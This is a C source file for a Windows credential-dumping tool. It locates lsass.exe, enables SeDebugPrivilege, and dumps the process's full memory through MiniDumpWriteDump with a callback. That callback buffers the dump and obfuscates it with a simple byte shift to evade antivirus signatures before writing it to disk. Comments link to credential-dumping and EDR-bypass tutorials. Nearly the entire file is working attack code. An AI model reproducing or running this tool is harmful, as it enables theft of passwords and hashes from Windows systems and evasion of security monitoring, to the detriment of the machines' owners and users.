#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <winternl.h>
#include <psapi.h>
#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "Version.lib")

#define MAXBUFF (1024 * 1024 * 100)


// Observation perso : WdFilter pose pb

// https://www.youtube.com/watch?v=mI3FgE1K4PE&list=PLEQL8X1EIhuMGl9dT0u-9MKDMOHFtCdmg&index=20&t=169s&ab_channel=HichamElAaouad
// https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
// https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6

EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);

DWORD GetProcessIDByName(const WCHAR *processName) {
	DWORD processID=0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(snapshot, &processEntry)) {
			do {
				char* currentProcessName = processEntry.szExeFile;
				if (strcmp(currentProcessName, processName) == 0) {
					printf("We found it\n");
					processID = processEntry.th32ProcessID;
					break;
				}
				else {
					printf("%ls pid = %ld / %ls\n", currentProcessName, processEntry.th32ProcessID, processName);
				}
			} while (Process32Next(snapshot, &processEntry));
		}
		CloseHandle(snapshot);
	}
	return processID;
}

BOOL isElevatedProcess() {
	BOOL isElevated = FALSE;
	HANDLE access_token;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &access_token)) {
		TOKEN_ELEVATION elevation;
		DWORD token_check = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(access_token, TokenElevation, &elevation, sizeof(elevation), &token_check)) {
			isElevated = elevation.TokenIsElevated;
		}
	}
	if (access_token) {
		CloseHandle(access_token);
	}
	return isElevated;
}

BOOL setPrivilege() {
	const wchar_t* privName = L"SeDebugPrivilege";
	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
	HANDLE tokenPriv = NULL;
	LUID luid = { 0,0 };
	BOOL status = TRUE;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenPriv)) {
		status = FALSE;
		goto EXIT;
	}
	if (!LookupPrivilegeValueW(0, privName, &luid)) {
		status = FALSE;
		goto EXIT;
	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
	if (!AdjustTokenPrivileges(tokenPriv, FALSE, &priv, 0, 0, 0)) {
		status = FALSE;
		goto EXIT;
	}
EXIT:
	if (tokenPriv) {
		CloseHandle(tokenPriv);
		return status;
	}
	return status;
}


LPVOID dumpBuffer;
DWORD bytesRead;

void encode(unsigned char* buf, size_t size) {
	for (size_t i = 0; i < size; ++i) {
		buf[i] = buf[i] + 1;
	}
}

BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
) {

	static int pathnbr = 0;

	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		printf("START %d\n", ++pathnbr);
		callbackOutput->Status = S_FALSE;
		break;
	case IoWriteAllCallback:
		printf("DATA %d\n", ++pathnbr);
		
		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

		// Size of the chunk of minidump that's just been read.
		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;
		if (bytesRead >= MAXBUFF) {
			printf("Outch overflow\n");
			exit(1);
		}
		printf("Starting copying %d bytes. The size will be %d bytes", bufferSize, bytesRead);
		RtlCopyMemory(destination, source, bufferSize);
		printf("OK\n");
		callbackOutput->Status = S_OK;
		encode(destination, bufferSize);
		break;
	case IoFinishCallback:
		printf("END %d\n", ++pathnbr);
		callbackOutput->Status = S_OK;
		break;

	case ModuleCallback:
		printf("X ModuleCallback\n");
		break;
	case ThreadCallback:
		printf("X ThreadCallback\n");
		break;
	case ThreadExCallback:
		printf("X ThreadExCallback\n");
		break;
	case IncludeThreadCallback:
		printf("X IncludeThreadCallback\n");
		break;
	case IncludeModuleCallback:
		printf("X IncludeModuleCallback\n");
		break;
	case MemoryCallback:
		printf("X MemoryCallback\n");
		break;
	case CancelCallback:
		printf("X CancelCallback\n");
		break;
	case WriteKernelMinidumpCallback:
		printf("X WriteKernelMinidumpCallback\n");
		break;
	case KernelMinidumpStatusCallback:
		printf("X KernelMinidumpStatusCallback\n");
		break;
	case RemoveMemoryCallback:
		printf("X RemoveMemoryCallback\n");
		break;
	case IncludeVmRegionCallback:
		printf("X IncludeVmRegionCallback\n");
		break;
	case ReadMemoryFailureCallback:
		printf("X ReadMemoryFailureCallback. Normally you should set status here ans maybe return false\n");
		break;
	case SecondaryFlagsCallback:
		printf("X SecondaryFlagsCallback\n");
		break;
	case IsProcessSnapshotCallback:
		printf("X IsProcessSnapshotCallback\n");
		break;
	case VmStartCallback:
		printf("X VmStartCallback\n");
		break;
	case VmQueryCallback:
		printf("X VmQueryCallback\n");
		break;
	case VmPreReadCallback:
		printf("X VmPreReadCallback\n");
		break;
	case VmPostReadCallback:
		printf("X VmPostReadCallback\n");
		break;
	default:
		printf("DEFAULT %d\n", ++pathnbr);
		break;
	}
	return TRUE;
}
int main(int argc, char *argv[]) {
	dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAXBUFF);
	bytesRead = 0;


	if (isElevatedProcess()) {
		printf("We have the required privileges\n");
	}
	else {
		printf("We don't have the required privileges\n");
		return 0;
	}

	char* processName = L"lsass.exe";
	DWORD processPID = GetProcessIDByName(processName);
	printf("lsasspid process PID is %d\n", processPID);

	if (setPrivilege()) {
		printf("seDebugPrivilege is enabled\n");
	}
	else {
		printf("seDebugPrivilege is not enabled\n");
		return 0;
	}

	LPCSTR fileName_pointer = L"C:\\Users\\sebastien.carre\\whitelist\\lsa.dump";
	HANDLE output = CreateFile(fileName_pointer, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD accessAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;

	HANDLE processHandler = OpenProcess(accessAllow, 0, processPID);
	if (processHandler == NULL) {
		printf("NULL handle check pid\n");
		exit(1);
	}
	if (processHandler == INVALID_HANDLE_VALUE) {
		printf("INVALID_HANDLE_VALUE handle\n");
		exit(1);
	}

	if (processHandler && processHandler != INVALID_HANDLE_VALUE) {
		//patchme();
		printf("in the place\n");

		MINIDUMP_CALLBACK_INFORMATION callbackInfo;
		ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
		callbackInfo.CallbackRoutine = &minidumpCallback;
		callbackInfo.CallbackParam = NULL;
		BOOL isDump = MiniDumpWriteDump(processHandler, processPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
		//BOOL isDump = MiniDumpWriteDump(processHandler, processPID, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
		if (isDump) {
			printf("%d\n", bytesRead);
			DWORD bytesWritten = 0;
			WriteFile(output, dumpBuffer, bytesRead,&bytesWritten,NULL);
			printf("[+] lsass is dumped : %d bytes\n", bytesWritten);
		}
		else {
			printf("[-] lsass is not dumped\n");
		}
	}
	CloseHandle(output);
	return 0;
}
/**************************************************************************/